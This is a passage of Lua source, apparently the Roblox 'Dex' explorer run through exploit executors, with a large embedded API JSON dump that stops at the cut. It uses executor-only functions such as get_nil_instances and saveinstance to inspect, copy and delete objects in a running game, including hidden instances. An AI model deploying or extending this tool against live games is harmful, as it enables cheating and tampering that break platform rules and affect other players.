		local connLookup = {}

		-- Returns whether a node would be present in the tree list
		local function nodeIsVisible(node)
			local visible = true
			node = node.Parent
			while node and visible do
				visible = visible and node.Expanded
				node = node.Parent
			end
			return visible
		end

		-- Removes an object's tree node. Called when the object stops existing in the
		-- game tree.
		local function removeObject(object)
			local objectNode = NodeLookup[object]
			if not objectNode then
				return
			end

			local visible = nodeIsVisible(objectNode)

			Selection:Remove(object,true)

			local parent = objectNode.Parent
			remove(parent,objectNode.Index)
			NodeLookup[object] = nil
			connLookup[object]:disconnect()
			connLookup[object] = nil

			if visible then
				updateList()
			elseif nodeIsVisible(parent) then
				updateScroll()
			end
		end

		-- Moves a tree node to a new parent. Called when an existing object's parent
		-- changes.
		local function moveObject(object,parent)
			local objectNode = NodeLookup[object]
			if not objectNode then
				return
			end

			local parentNode = NodeLookup[parent]
			if not parentNode then
				return
			end

			local visible = nodeIsVisible(objectNode)

			remove(objectNode.Parent,objectNode.Index)
			objectNode.Parent = parentNode

			objectNode.Depth = depth(object)
			local function r(node,d)
				for i = 1,#node do
					node[i].Depth = d
					r(node[i],d+1)
				end
			end
			r(objectNode,objectNode.Depth+1)

			insert(parentNode,#parentNode+1,objectNode)

			if visible or nodeIsVisible(objectNode) then
				updateList()
			elseif nodeIsVisible(objectNode.Parent) then
				updateScroll()
			end
		end

		-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
		-- This RobloxLocked object lets me index its properties for some reason

		local function check(object)
			return object.AncestryChanged
		end

		-- Creates a new tree node from an object. Called when an object starts
		-- existing in the game tree.
		local function addObject(object,noupdate)
			if script then
				-- protect against naughty RobloxLocked objects
				local s = pcall(check,object)
				if not s then
					return
				end
			end

			local parentNode = NodeLookup[object.Parent]
			if not parentNode then
				return
			end

			local objectNode = {
				Object = object;
				Parent = parentNode;
				Index = 0;
				Expanded = false;
				Selected = false;
				Depth = depth(object);
			}

			connLookup[object] = Connect(object.AncestryChanged,function(c,p)
				if c == object then
					if p == nil then
						removeObject(c)
					else
						moveObject(c,p)
					end
				end
			end)

			NodeLookup[object] = objectNode
			insert(parentNode,#parentNode+1,objectNode)

			if not noupdate then
				if nodeIsVisible(objectNode) then
					updateList()
				elseif nodeIsVisible(objectNode.Parent) then
					updateScroll()
				end
			end
		end

		local function makeObject(obj,par)
			local newObject = Instance.new(obj.ClassName)
			for i,v in pairs(obj.Properties) do
				ypcall(function()
					local newProp
					newProp = ToPropValue(v.Value,v.Type)
					newObject[v.Name] = newProp
				end)
			end
			newObject.Parent = par
		end

		local function writeObject(obj)
			local newObject = {ClassName = obj.ClassName, Properties = {}}
			for i,v in pairs(RbxApi.GetProperties(obj.className)) do
				if v["Name"] ~= "Parent" then
					print("thispassed")
					table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
				end
			end
			return newObject
		end

		local function buildDexStorage()
			local localDexStorage

			local success,err = ypcall(function()
				localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")[1]
			end)

			if success and localDexStorage then
				for i,v in pairs(localDexStorage:GetChildren()) do
					ypcall(function()
						v.Parent = DexStorageMain
					end)
				end
			end

			updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
		end

		local dexStorageDebounce = false
		local dexStorageListeners = {}

		local function updateDexStorage()
			if dexStorageDebounce then return end
			dexStorageDebounce = true	

			wait()

			pcall(function()
				saveinstance("content//DexStorage.rbxm",DexStorageMain)
			end)

			updateDexStorageListeners()

			dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
		end

		function updateDexStorageListeners()
			for i,v in pairs(dexStorageListeners) do
				v:Disconnect()
			end
			dexStorageListeners = {}
			for i,v in pairs(DexStorageMain:GetChildren()) do
				pcall(function()
					local ev = v.Changed:connect(updateDexStorage)
					table.insert(dexStorageListeners,ev)
				end)
			end
		end

		do
			NodeLookup[workspace.Parent] = {
				Object = workspace.Parent;
				Parent = nil;
				Index = 0;
				Expanded = true;
			}

			if DexStorageEnabled then
				NodeLookup[DexStorage] = {
					Object = DexStorage;
					Parent = nil;
					Index = 0;
					Expanded = true;
				}
			end

			if NilStorageEnabled then
				NodeLookup[NilStorage] = {
					Object = NilStorage;
					Parent = nil;
					Index = 0;
					Expanded = true;
				}
			end

			Connect(game.DescendantAdded,addObject)
			Connect(game.DescendantRemoving,removeObject)

			if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]

				buildDexStorage()

				Connect(DexStorage.DescendantAdded,addObject)
				Connect(DexStorage.DescendantRemoving,removeObject)

				Connect(DexStorage.DescendantAdded,updateDexStorage)
				Connect(DexStorage.DescendantRemoving,updateDexStorage)
			end

			if NilStorageEnabled then
				Connect(NilStorage.DescendantAdded,addObject)
				Connect(NilStorage.DescendantRemoving,removeObject)		

				local currentTable = get_nil_instances()	

				spawn(function()
					while wait() do
						if #currentTable ~= #get_nil_instances() then
							currentTable = get_nil_instances()
							--NilStorageMain:ClearAllChildren()
							for i,v in pairs(get_nil_instances()) do
								if v ~= NilStorage and v ~= DexStorage then
									pcall(function()
										v.Parent = NilStorageMain
									end)
							--[[
							local newNil = v
							newNil.Archivable = true
							newNil:Clone().Parent = NilStorageMain
							--]]
								end
							end
						end
					end
				end)
			end

			local function get(o)
				return o:GetChildren()
			end

			local function r(o)
				local s,children = pcall(get,o)
				if s then
					for i = 1,#children do
						addObject(children[i],true)
						r(children[i])
					end
				end
			end

			r(workspace.Parent)
			if DexStorageEnabled then
				r(DexStorage)
			end
			if NilStorageEnabled then
				r(NilStorage)
			end

			scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
			updateList()
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Actions

		local actionButtons do
			actionButtons = {}

			local totalActions = 1
			local currentActions = totalActions
			local function makeButton(icon,over,name,vis,cond)
				local buttonEnabled = false

				local button = Create(Icon('ImageButton',icon),{
					Name = name .. "Button";
					Visible = Option.Modifiable and Option.Selectable;
					Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
					Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
					Parent = headerFrame;
				})

				local tipText = Create('TextLabel',{
					Name = name .. "Text";
					Text = name;
					Visible = false;
					BackgroundTransparency = 1;
					TextXAlignment = 'Right';
					Font = FONT;
					FontSize = FONT_SIZE;
					Position = UDim2.new(0,0,0,0);
					Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
					Parent = headerFrame;
				})


				button.MouseEnter:connect(function()
					if buttonEnabled then
						button.BackgroundTransparency = 0.9
					end
					--Icon(button,over)
					--tipText.Visible = true
				end)
				button.MouseLeave:connect(function()
					button.BackgroundTransparency = 1
					--Icon(button,icon)
					--tipText.Visible = false
				end)

				currentActions = currentActions + 1
				actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
				QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
					if on then
						buttonEnabled = true
						Icon(button,over)
					else
						buttonEnabled = false
						Icon(button,icon)
					end
				end}
				return button
			end

			--local clipboard = {}
			local function delete(o)
				o.Parent = nil
			end

			makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()

			end)


			-- DELETE
			makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			end)

			-- PASTE
			makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			end)

			-- COPY
			makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			end)

			-- CUT
			makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			end)

			-- FREEZE
			makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)

			-- ADD/REMOVE STARRED
			makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)

			-- STARRED
			makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


			-- SORT
			-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Option Bindables

		do
			local optionCallback = {
				Modifiable = function(value)
					for i = 1,#actionButtons do
						actionButtons[i].Obj.Visible = value and Option.Selectable
					end
					cancelReparentDrag()
				end;
				Selectable = function(value)
					for i = 1,#actionButtons do
						actionButtons[i].Obj.Visible = value and Option.Modifiable
					end
					cancelSelectDrag()
					Selection:Set({})
				end;
			}

			local bindSetOption = explorerPanel:FindFirstChild("SetOption")
			if not bindSetOption then
				bindSetOption = Create('BindableFunction',{Name = "SetOption"})
				bindSetOption.Parent = explorerPanel
			end

			bindSetOption.OnInvoke = function(optionName,value)
				if optionCallback[optionName] then
					Option[optionName] = value
					optionCallback[optionName](value)
				end
			end

			local bindGetOption = explorerPanel:FindFirstChild("GetOption")
			if not bindGetOption then
				bindGetOption = Create('BindableFunction',{Name = "GetOption"})
				bindGetOption.Parent = explorerPanel
			end

			bindGetOption.OnInvoke = function(optionName)
				if optionName then
					return Option[optionName]
				else
					local options = {}
					for k,v in pairs(Option) do
						options[k] = v
					end
					return options
				end
			end
		end

		function SelectionVar()
			return Selection
		end

		Input.InputBegan:connect(function(key)
			if key.KeyCode == Enum.KeyCode.LeftControl then
				HoldingCtrl = true
			end
			if key.KeyCode == Enum.KeyCode.LeftShift then
				HoldingShift = true
			end
		end)

		Input.InputEnded:connect(function(key)
			if key.KeyCode == Enum.KeyCode.LeftControl then
				HoldingCtrl = false
			end
			if key.KeyCode == Enum.KeyCode.LeftShift then
				HoldingShift = false
			end
		end)

		while RbxApi == nil do
			RbxApi = GetApiRemote:Invoke()
			wait()
		end

		explorerFilter.Changed:connect(function(prop)
			if prop == "Text" then
				rawUpdateList()
			end
		end)

		CurrentInsertObjectWindow = CreateInsertObjectMenu(
			GetClasses(),
			"",
			false,
			function(option)
				CurrentInsertObjectWindow.Visible = false
				local list = SelectionVar():Get()
				for i = 1,#list do
					pcall(function() Instance.new(option,list[i]) end)
				end
				DestroyRightClick()
			end
		)
	end)
	spawn(function()
	--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

		wait(0.2)

		local print = function(s)
			print(tostring(s))
		end

		-- Services
		local Teams = game:GetService("Teams")
		local Workspace = game:GetService("Workspace")
		local Debris = game:GetService("Debris")
		local ContentProvider = game:GetService("ContentProvider")
		local Players = game:GetService("Players")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")

		-- Functions
		function httpGet(url)
			return print(url)
		end

		-- RbxApi Stuff

		local apiUrl = "http://anaminus.github.io/rbx/json/api/latest.json"
		local maxChunkSize = 100 * 1000
		local ApiJson
		if script:FindFirstChild("RawApiJson") then
			ApiJson = script.RawApiJson
		else
			ApiJson = ""
		end


		function getLocalApiJson()
			local rawApiJson = [===[
	[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["RobloxPlaceSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"YieldFunction"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":[],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":[],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":["deprecated"],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrackState","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"revertUrl","Default":null}],"Name":"SetAssetRevertUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"versionsUrl","Default":null}],"Name":"SetAssetVersionsUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"accessUrl","Default":null}],"Name":"SetPlaceAccessUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAwardBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"seconds","Default":null}],"Name":"SetHasBadgeCooldown","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetHasBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeDisabledUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeLegalUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceId","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable","notbrowsable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScript